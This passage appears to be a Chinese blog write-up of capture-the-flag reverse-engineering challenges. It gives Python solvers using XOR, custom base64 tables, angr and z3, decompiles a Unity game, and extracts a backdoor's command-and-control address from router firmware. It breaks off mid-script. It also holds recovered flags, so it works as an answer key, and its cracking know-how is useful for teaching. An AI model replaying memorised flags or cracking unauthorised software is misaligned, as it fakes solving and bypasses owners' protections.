class="headerlink" title="[MRCTF2020]Xor"></a>[MRCTF2020]Xor</h3><p>简单异或加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">0x4D</span>, <span class="number">0x53</span>, <span class="number">0x41</span>, <span class="number">0x57</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x46</span>, <span class="number">0x58</span>, <span class="number">0x5A</span>, <span class="number">0x3A</span>, <span class="number">0x4A</span>, <span class="number">0x3A</span>, <span class="number">0x60</span>, <span class="number">0x74</span>, <span class="number">0x51</span>, <span class="number">0x4A</span>, <span class="number">0x22</span>, <span class="number">0x4E</span>, <span class="number">0x40</span>, <span class="number">0x20</span>, <span class="number">0x62</span>, <span class="number">0x70</span>, <span class="number">0x64</span>, <span class="number">0x64</span>, <span class="number">0x7D</span>, <span class="number">0x38</span>, <span class="number">0x67</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">27</span>):</span><br><span class="line">    flag += <span class="built_in">bytes</span>([data[i] ^ i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="FlareOn4-IgniteMe"><a href="#FlareOn4-IgniteMe" class="headerlink" title="[FlareOn4]IgniteMe"></a>[FlareOn4]IgniteMe</h3><p>简单异或加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [  <span class="number">13</span>,  <span class="number">38</span>,  <span class="number">73</span>,  <span class="number">69</span>,  <span class="number">42</span>,  <span class="number">23</span>, <span class="number">120</span>,  <span class="number">68</span>,  <span class="number">43</span>, <span class="number">108</span>, </span><br><span class="line">   <span class="number">93</span>,  <span class="number">94</span>,  <span class="number">69</span>,  <span class="number">18</span>,  <span class="number">47</span>,  <span class="number">23</span>,  <span class="number">43</span>,  <span class="number">68</span>, <span class="number">111</span>, <span class="number">110</span>, </span><br><span class="line">   <span class="number">86</span>,   <span class="number">9</span>,  <span class="number">95</span>,  <span class="number">69</span>,  <span class="number">71</span>, <span class="number">115</span>,  <span class="number">38</span>,  <span class="number">10</span>,  <span class="number">13</span>,  <span class="number">19</span>, </span><br><span class="line">   <span class="number">23</span>,  <span class="number">72</span>,  <span class="number">66</span>,   <span class="number">1</span>,  <span class="number">64</span>,  <span class="number">77</span>,  <span class="number">12</span>,   <span class="number">2</span>, <span class="number">105</span>]</span><br><span class="line"></span><br><span class="line">v4 = <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    data[i] ^= v4</span><br><span class="line">    v4 = data[i]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-hello-world-go"><a href="#MRCTF2020-hello-world-go" class="headerlink" title="[MRCTF2020]hello_world_go"></a>[MRCTF2020]hello_world_go</h3><p>ida打开就看到flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211001222330183.png" alt="image-20211001222330183"></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211001222354843.png" alt="image-20211001222354843"></p><h3 id="WUSTCTF2020-level3"><a href="#WUSTCTF2020-level3" class="headerlink" title="[WUSTCTF2020]level3"></a>[WUSTCTF2020]level3</h3><p>base64换表加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = <span class="string">&quot;d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==&quot;</span></span><br><span class="line"></span><br><span class="line">new_table = <span class="string">&quot;TSRQPONMLKJIHGFEDCBAUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">data = data.translate(<span class="built_in">str</span>.maketrans(new_table, old_table))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(data))</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-Cr0ssfun"><a href="#WUSTCTF2020-Cr0ssfun" class="headerlink" title="[WUSTCTF2020]Cr0ssfun"></a>[WUSTCTF2020]Cr0ssfun</h3><p>angr直接解</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./Cr0ssfun&#x27;</span>, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line">state = proj.factory.entry_state()</span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line">simgr.explore(find=<span class="number">0x400000</span>+ <span class="number">0x000000000001500</span>, avoid=<span class="number">0x400000</span>+<span class="number">0x0000000000001513</span>)</span><br><span class="line"><span class="built_in">print</span>(simgr.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><h3 id="BJDCTF2020-BJD-hamburger-competition"><a href="#BJDCTF2020-BJD-hamburger-competition" class="headerlink" title="[BJDCTF2020]BJD hamburger competition"></a>[BJDCTF2020]BJD hamburger competition</h3><p>Unity写的，根据谷歌搜索到的<a href="https://gameinstitute.qq.com/community/detail/102819">Unity游戏逆向及破解方法介绍-腾讯游戏学堂 (qq.com)</a></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211001225202074.png" alt="image-20211001225202074"></p><p>我们将Assembly-CSharp.dll 拖进dnspy反编译，得到核心代码：</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211001225305244.png" alt="image-20211001225305244"></p><p>丢进<a href="http://www.ttmd5.com/hash.php?type=5">sha1在线解密 在线加密 (ttmd5.com)</a>解得1001, 根据Md5函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static string Md5(string str)</span><br><span class="line">&#123;</span><br><span class="line">byte[] bytes = Encoding.UTF8.GetBytes(str);</span><br><span class="line">byte[] array = MD5.Create().ComputeHash(bytes);</span><br><span class="line">StringBuilder stringBuilder = new StringBuilder();</span><br><span class="line">foreach (byte b in array)</span><br><span class="line">&#123;</span><br><span class="line">stringBuilder.Append(b.ToString(&quot;X2&quot;));</span><br><span class="line">&#125; // 转大写</span><br><span class="line">return stringBuilder.ToString().Substring(0, 20);  // 返回前20位</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bpython version 0.20 on top of Python 3.6.9 /usr/local/bin/python3</span><br><span class="line">&gt;&gt;&gt; import hashlib</span><br><span class="line">&gt;&gt;&gt; hashlib.md5(b&quot;1001&quot;).hexdigest()</span><br><span class="line">&#x27;b8c37e33defde51cf91e1e03e51657da&#x27;</span><br><span class="line">&gt;&gt;&gt; hashlib.md5(b&quot;1001&quot;).hexdigest()[:20]</span><br><span class="line">&#x27;b8c37e33defde51cf91e&#x27;</span><br><span class="line">&gt;&gt;&gt; hashlib.md5(b&quot;1001&quot;).hexdigest()[:20].upper()</span><br><span class="line">&#x27;B8C37E33DEFDE51CF91E&#x27;</span><br></pre></td></tr></table></figure><h3 id="FlareOn6-Overlong"><a href="#FlareOn6-Overlong" class="headerlink" title="[FlareOn6]Overlong"></a>[FlareOn6]Overlong</h3><p>IDA打开后面还有东西，动调修改大小为<code>0xb0</code>出flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211001230317030.png" alt="image-20211001230317030"></p><h3 id="ACTF新生赛2020-Oruga"><a href="#ACTF新生赛2020-Oruga" class="headerlink" title="[ACTF新生赛2020]Oruga"></a>[ACTF新生赛2020]Oruga</h3><p>迷宫题，迷宫为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 23 00 00 00 00 00 00 00 23 23 23 23</span><br><span class="line">00 00 00 23 23 00 00 00 4F 4F 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 4F 4F 00 50 50 00 00 00</span><br><span class="line">00 00 00 4C 00 4F 4F 00 4F 4F 00 50 50 00 00 00</span><br><span class="line">00 00 00 4C 00 4F 4F 00 4F 4F 00 50 00 00 00 00</span><br><span class="line">00 00 4C 4C 00 4F 4F 00 00 00 00 50 00 00 00 00</span><br><span class="line">00 00 00 00 00 4F 4F 00 00 00 00 50 00 00 00 00</span><br><span class="line">23 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 23 00 00 00</span><br><span class="line">00 00 00 00 00 00 4D 4D 4D 00 00 00 23 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 4D 4D 4D 00 00 00 00 45 45</span><br><span class="line">00 00 00 30 00 4D 00 4D 00 4D 00 00 00 00 45 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 45 45</span><br><span class="line">54 54 54 49 00 4D 00 4D 00 4D 00 00 00 00 45 00</span><br><span class="line">00 54 00 49 00 4D 00 4D 00 4D 00 00 00 00 45 00</span><br><span class="line">00 54 00 49 00 4D 00 4D 00 4D 21 00 00 00 45 45</span><br></pre></td></tr></table></figure><p>到达 0x21处停止</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">W 向上</span><br><span class="line">E 向右</span><br><span class="line">M 向下</span><br><span class="line">J 向左</span><br></pre></td></tr></table></figure><p>根据可知，0可以一直移动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">while ( !data[v2] )</span><br><span class="line">   &#123;</span><br><span class="line">     if ( v4 == -1 &amp;&amp; (v2 &amp; 0xF) == 0 )</span><br><span class="line">       return 0LL;</span><br><span class="line">     if ( v4 == 1 &amp;&amp; v2 % 16 == 0xF )</span><br><span class="line">       return 0LL;</span><br><span class="line">     if ( v4 == 16 &amp;&amp; (unsigned int)(v2 - 0xF0) &lt;= 0xF )</span><br><span class="line">       return 0LL;</span><br><span class="line">     if ( v4 == -16 &amp;&amp; (unsigned int)(v2 + 0xF) &lt;= 0x1E )</span><br><span class="line">       return 0LL;</span><br><span class="line">     v2 += v4;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>手动解得<code>MEWEMEWJMEWJM</code></p><h3 id="FlareOn3-Challenge1"><a href="#FlareOn3-Challenge1" class="headerlink" title="[FlareOn3]Challenge1"></a>[FlareOn3]Challenge1</h3><p>经典换表base64编码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">new_table = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q&quot;</span></span><br><span class="line"></span><br><span class="line">data = data.translate(<span class="built_in">str</span>.maketrans(new_table, old_table))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(data))</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-basic-re"><a href="#UTCTF2020-basic-re" class="headerlink" title="[UTCTF2020]basic-re"></a>[UTCTF2020]basic-re</h3><p>看下汇编就出flag</p><h3 id="Zer0pts2020-easy-strcmp"><a href="#Zer0pts2020-easy-strcmp" class="headerlink" title="[Zer0pts2020]easy strcmp"></a>[Zer0pts2020]easy strcmp</h3><p>修改了strcmp, 实际先进行了一点操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_55E12AB7F6EA(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+18h] [rbp-8h]</span><br><span class="line">  int v4; // [rsp+18h] [rbp-8h]</span><br><span class="line">  int j; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">    ;</span><br><span class="line">  v4 = (i &gt;&gt; 3) + 1;</span><br><span class="line">  for ( j = 0; j &lt; v4; ++j )</span><br><span class="line">    *(_QWORD *)(8 * j + a1) -= qword_55E12AD80060[j];</span><br><span class="line">  return qword_55E12AD80090(a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密脚本如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">b&quot;zer0pts&#123;********CENSORED********&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(data))</span><br><span class="line">sub_data = [<span class="number">0x0000000000000000</span>, <span class="number">0x410A4335494A0942</span>, <span class="number">0x0B0EF2F50BE619F0</span>, <span class="number">0x4F0A3A064A35282B</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">_data = struct.unpack(<span class="string">&quot;&lt;4Q&quot;</span>, data)</span><br><span class="line"><span class="built_in">print</span>(_data)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    flag += struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, (_data[i] + sub_data[i]) &amp; <span class="number">0xffffffffffffffff</span>)</span><br><span class="line"><span class="built_in">print</span>(flag + <span class="string">b&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-Universe-final-answer"><a href="#ACTF新生赛2020-Universe-final-answer" class="headerlink" title="[ACTF新生赛2020]Universe_final_answer"></a>[ACTF新生赛2020]Universe_final_answer</h3><p>z3直接解</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&quot;x%d&quot;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line">v1 = x[<span class="number">1</span>]</span><br><span class="line">v2 = x[<span class="number">0</span>]</span><br><span class="line">v3 = x[<span class="number">2</span>]</span><br><span class="line">v4 = x[<span class="number">3</span>]</span><br><span class="line">v5 = x[<span class="number">4</span>]</span><br><span class="line">v6 = x[<span class="number">6</span>]</span><br><span class="line">v7 = x[<span class="number">5</span>]</span><br><span class="line">v8 = x[<span class="number">7</span>]</span><br><span class="line">v9 = x[<span class="number">8</span>]</span><br><span class="line"></span><br><span class="line">s.add(-<span class="number">85</span> * v9 + <span class="number">58</span> * v8 + <span class="number">97</span> * v6 + v7 + -<span class="number">45</span> * v5 + <span class="number">84</span> * v4 + <span class="number">95</span> * v2 - <span class="number">20</span> * v1 + <span class="number">12</span> * v3 == <span class="number">12613</span>)</span><br><span class="line">v11 = x[<span class="number">9</span>]</span><br><span class="line">s.add(<span class="number">30</span> * v11 + -<span class="number">70</span> * v9 + -<span class="number">122</span> * v6 + -<span class="number">81</span> * v7 + -<span class="number">66</span> * v5 + -<span class="number">115</span> * v4 + -<span class="number">41</span> * v3 + -<span class="number">86</span> * v1 - <span class="number">15</span> * v2 - <span class="number">30</span> * v8 == -<span class="number">54400</span>)</span><br><span class="line">s.add(-<span class="number">103</span> * v11 + <span class="number">120</span> * v8 + <span class="number">108</span> * v7 + <span class="number">48</span> * v4 + -<span class="number">89</span> * v3 + <span class="number">78</span> * v1 - <span class="number">41</span> * v2 + <span class="number">31</span> * v5 - (v6 &lt;&lt; <span class="number">6</span>) - <span class="number">120</span> * v9 == -<span class="number">10283</span>)</span><br><span class="line">s.add(<span class="number">71</span> * v6 + (v7 &lt;&lt; <span class="number">7</span>) + <span class="number">99</span> * v5 + -<span class="number">111</span> * v3 + <span class="number">85</span> * v1 + <span class="number">79</span> * v2 - <span class="number">30</span> * v4 - <span class="number">119</span> * v8 + <span class="number">48</span> * v9 - <span class="number">16</span> * v11 == <span class="number">22855</span>)</span><br><span class="line">s.add(<span class="number">5</span> * v11 + <span class="number">23</span> * v9 + <span class="number">122</span> * v8 + -<span class="number">19</span> * v6 + <span class="number">99</span> * v7 + -<span class="number">117</span> * v5 + -<span class="number">69</span> * v3 + <span class="number">22</span> * v1 - <span class="number">98</span> * v2 + <span class="number">10</span> * v4 == -<span class="number">2944</span>)</span><br><span class="line">s.add(-<span class="number">54</span> * v11 + -<span class="number">23</span> * v8 + -<span class="number">82</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">124</span> * v1 - <span class="number">11</span> * v4 - <span class="number">8</span> * v5 - <span class="number">60</span> * v7 + <span class="number">95</span> * v6 + <span class="number">100</span> * v9 == -<span class="number">2222</span>)</span><br><span class="line">s.add(-<span class="number">83</span> * v11 + -<span class="number">111</span> * v7 + -<span class="number">57</span> * v2 + <span class="number">41</span> * v1 + <span class="number">73</span> * v3 - <span class="number">18</span> * v4 + <span class="number">26</span> * v5 + <span class="number">16</span> * v6 + <span class="number">77</span> * v8 - <span class="number">63</span> * v9 == -<span class="number">13258</span>)</span><br><span class="line">s.add(<span class="number">81</span> * v11 + -<span class="number">48</span> * v9 + <span class="number">66</span> * v8 + -<span class="number">104</span> * v6 + -<span class="number">121</span> * v7 + <span class="number">95</span> * v5 + <span class="number">85</span> * v4 + <span class="number">60</span> * v3 + -<span class="number">85</span> * v2 + <span class="number">80</span> * v1 == -<span class="number">1559</span>)</span><br><span class="line">s.add(<span class="number">101</span> * v11 + -<span class="number">85</span> * v9 + <span class="number">7</span> * v6 + <span class="number">117</span> * v7 + -<span class="number">83</span> * v5 + -<span class="number">101</span> * v4 + <span class="number">90</span> * v3 + -<span class="number">28</span> * v1 + <span class="number">18</span> * v2 - v8 == <span class="number">6308</span>)</span><br><span class="line">s.add(<span class="number">99</span> * v11 + -<span class="number">28</span> * v9 + <span class="number">5</span> * v8 + <span class="number">93</span> * v6 + -<span class="number">18</span> * v7 + -<span class="number">127</span> * v5 + <span class="number">6</span> * v4 + -<span class="number">9</span> * v3 + -<span class="number">93</span> * v1 + <span class="number">58</span> * v2 == -<span class="number">1697</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    s.add(x[i] &gt;= <span class="number">0x20</span>)</span><br><span class="line">    s.add(x[i] &lt;= <span class="number">0x7e</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        flag += <span class="built_in">bytes</span>([m[x[i]].as_long()])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>输入得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  tmp ./UniverseFinalAnswer</span><br><span class="line">Please give me the key string:F0uRTy_7w@</span><br><span class="line">Judgement pass! flag is actf&#123;F0uRTy_7w@_42&#125;</span><br></pre></td></tr></table></figure><h3 id="firmware"><a href="#firmware" class="headerlink" title="firmware"></a>firmware</h3><p>binwalk固件提取, 后用firmware-mod-kit分析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  firmware-mod-kit-master ./unsquashfs_all.sh 120200.squashfs</span><br><span class="line">Attempting to extract SquashFS 4.X file system...</span><br><span class="line"></span><br><span class="line">Skipping squashfs-2.1-r2 (wrong version)...</span><br><span class="line">Skipping squashfs-3.0 (wrong version)...</span><br><span class="line">Skipping squashfs-3.0-lzma-damn-small-variant (wrong version)...</span><br><span class="line">Skipping others/squashfs-2.0-nb4 (wrong version)...</span><br><span class="line">Skipping others/squashfs-2.2-r2-7z (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.0-e2100 (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.2-r2 (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.2-r2-lzma (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.2-r2-lzma/squashfs3.2-r2/squashfs-tools (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.2-r2-hg612-lzma (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.2-r2-wnr1000 (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.2-r2-rtn12 (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.3 (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.3-lzma/squashfs3.3/squashfs-tools (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.3-grml-lzma/squashfs3.3/squashfs-tools (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.4-cisco (wrong version)...</span><br><span class="line">Skipping others/squashfs-3.4-nb4 (wrong version)...</span><br><span class="line"></span><br><span class="line">Trying ./src/others/squashfs-4.2-official/unsquashfs... Parallel unsquashfs: Using 8 processors</span><br><span class="line"></span><br><span class="line">Trying ./src/others/squashfs-4.2/unsquashfs... Parallel unsquashfs: Using 8 processors</span><br><span class="line"></span><br><span class="line">Trying ./src/others/squashfs-4.0-lzma/unsquashfs-lzma... Parallel unsquashfs: Using 8 processors</span><br><span class="line">480 inodes (523 blocks) to write</span><br><span class="line"></span><br><span class="line">[=========================================================================================-              ] 454/523  86%</span><br><span class="line">created 341 files</span><br><span class="line">created 39 directories</span><br><span class="line">created 70 symlinks</span><br><span class="line">created 0 devices</span><br><span class="line">created 0 fifos</span><br><span class="line">File system sucessfully extracted!</span><br><span class="line">MKFS=&quot;./src/others/squashfs-4.0-lzma/mksquashfs-lzma&quot;</span><br></pre></td></tr></table></figure><p>提取出来后，在tmp中找到backdoor， upx解壳，开始找<code>网址:端口</code></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002002850232.png" alt="image-20211002002850232"></p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002002928087.png" alt="image-20211002002928087"></p><p>得到<code>echo.byethost51.com:36667</code></p><p>则flag:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  tmp bpython3</span><br><span class="line">bpython version 0.20 on top of Python 3.6.9 /usr/local/bin/python3</span><br><span class="line">&gt;&gt;&gt; import hashlib</span><br><span class="line">&gt;&gt;&gt; hashlib.md5(b&quot;echo.byethost51.com:36667&quot;).hexdigest()</span><br><span class="line">&#x27;33a422c45d551ac6e4756f59812a954b&#x27;</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-level4"><a href="#WUSTCTF2020-level4" class="headerlink" title="[WUSTCTF2020]level4"></a>[WUSTCTF2020]level4</h3><p>根据提示，可知程序生成一个二叉树，并输出中序遍历、后序遍历。则应求先序遍历。</p><p>由已知得节点结构如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000 node            struc ; (sizeof=0x18, mappedto_8)</span><br><span class="line">00000000 data            dq ? </span><br><span class="line">00000008 left            dq ?    </span><br><span class="line">00000010 right           dq ?</span><br></pre></td></tr></table></figure><p>修改一下得二叉树结构</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211002010246991.png" alt="image-20211002010246991"></p><p>则解密脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="string">&quot;I&#123;_&#125;Af2700ih_secTS2Et_wr&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>:</span></span><br><span class="line">    data = -<span class="number">1</span></span><br><span class="line">    left = -<span class="number">1</span></span><br><span class="line">    right = -<span class="number">1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        self.data = data</span><br><span class="line"></span><br><span class="line">x = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    x.append(TreeNode(i))</span><br><span class="line"></span><br><span class="line">x[<span class="number">22</span>].left = <span class="number">15</span></span><br><span class="line">x[<span class="number">15</span>].left = <span class="number">20</span></span><br><span class="line">x[<span class="number">20</span>].left = <span class="number">5</span></span><br><span class="line">x[<span class="number">5</span>].left = <span class="number">6</span></span><br><span class="line">x[<span class="number">5</span>].right = <span class="number">8</span></span><br><span class="line">x[<span class="number">20</span>].right = <span class="number">18</span></span><br><span class="line">x[<span class="number">18</span>].left = <span class="number">9</span></span><br><span class="line">x[<span class="number">18</span>].right = <span class="number">1</span></span><br><span class="line">x[<span class="number">1</span>].left = <span class="number">16</span></span><br><span class="line">x[<span class="number">1</span>].right = <span class="number">11</span></span><br><span class="line">x[<span class="number">15</span>].right = <span class="number">10</span></span><br><span class="line">x[<span class="number">10</span>].left = <span class="number">13</span></span><br><span class="line">x[<span class="number">10</span>].right = <span class="number">2</span></span><br><span class="line">x[<span class="number">2</span>].left = <span class="number">0</span></span><br><span class="line">x[<span class="number">2</span>].right = <span class="number">17</span></span><br><span class="line">x[<span class="number">22</span>].right = <span class="number">21</span></span><br><span class="line">x[<span class="number">21</span>].left = <span class="number">4</span></span><br><span class="line">x[<span class="number">21</span>].right = <span class="number">12</span></span><br><span class="line">x[<span class="number">12</span>].right = <span class="number">7</span></span><br><span class="line">x[<span class="number">7</span>].left = <span class="number">23</span></span><br><span class="line">x[<span class="number">7</span>].right = <span class="number">14</span></span><br><span class="line">x[<span class="number">14</span>].left = <span class="number">19</span></span><br><span class="line">x[<span class="number">14</span>].right = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">preOrder</span>(<span class="params">index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> index != -<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(x[index].data, end = <span class="string">&quot;&quot;</span>)</span><br><span class="line">        preOrder(x[index].left)</span><br><span class="line">        preOrder(x[index].right)</span><br><span class="line"></span><br><span class="line">preOrder(<span class="number">22</span>)</span><br></pre></td></tr></table></figure><h3 id="网鼎杯-2020-青龙组-singal"><a href="#网鼎杯-2020-青龙组-singal" class="headerlink" title="[网鼎杯 2020 青龙组]singal"></a>[网鼎杯 2020 青龙组]singal</h3><p><a href="https://lantern.cool/wp-games-2020wd/">2020 网鼎杯 | Lantern’s 小站</a></p><h3 id="GUET-CTF2019-number-game"><a href="#GUET-CTF2019-number-game" class="headerlink" title="[GUET-CTF2019]number_game"></a>[GUET-CTF2019]number_game</h3><p>一个明显的5 * 5的数独游戏，用z3直接解， 得到中序遍历后的序列。</p><p>动态调试，跳过格式校验后，得到位置对应关系</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0123456789</span><br><span class="line">7381940526</span><br></pre></td></tr></table></figure><p>则逆推得到flag</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line"></span><br><span class="line">data = <span class="string">b&quot;14#2330#1#0#23##3##042##1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">if</span> data[i] != <span class="number">0x23</span>:</span><br><span class="line">        s.add(x[i] == data[i])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s.add(x[i] &gt; <span class="number">0x2f</span>)</span><br><span class="line">        s.add(x[i] &lt;= <span class="number">0x34</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(j + <span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">            s.add(x[<span class="number">5</span> * i + j] != x[<span class="number">5</span> * i + k])</span><br><span class="line">            s.add(x[<span class="number">5</span> * j + i] != x[<span class="number">5</span> * k + i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    _data = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">        _data += <span class="built_in">bytes</span>([m[x[i]].as_long()])</span><br><span class="line">    <span class="built_in">print</span>(_data)</span><br><span class="line"></span><br><span class="line">_flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    <span class="keyword">if</span> data[i] == <span class="number">0x23</span>:</span><br><span class="line">        